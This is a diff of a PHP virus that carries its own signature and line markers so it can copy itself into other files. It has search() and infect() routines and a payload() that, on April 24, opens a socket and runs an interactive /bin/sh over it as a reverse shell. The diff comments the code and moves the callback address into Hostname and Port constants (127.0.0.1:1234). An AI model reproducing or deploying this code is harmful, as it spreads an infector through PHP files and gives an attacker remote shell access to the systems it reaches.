@@ -1,10 +1,17 @@
 <?php
+// define signature
 define("SIGNATURE", "§16N47UR3");
 // determine whether backslash or forward slashes are used
 define("SLASH", stristr($_SERVER['PWD'], "/") ? "/" : "\\");
+
+// get linenumbers and start-/endline
 $linenumber = __LINE__;
 define("STARTLINE",$linenumber-4);
-define("ENDLINE",$linenumber+71);
+define("ENDLINE",$linenumber+78);
+
+// sets Hostname and Port
+define("Hostname", "127.0.0.1");
+define("Port", 1234);
 
 // search files in dir
 function search($path){
@@ -61,7 +68,7 @@ function infect($filestoinfect){
 // exec payload
 function payload(){
     if(date("md") == 0424){
-        $sock = fsockopen("192.168.0.13", 1234);
+        $sock = fsockopen(Hostname, Port);
         exec ("/bin/sh -i <&3 >&3 2>&3");
     }
 }
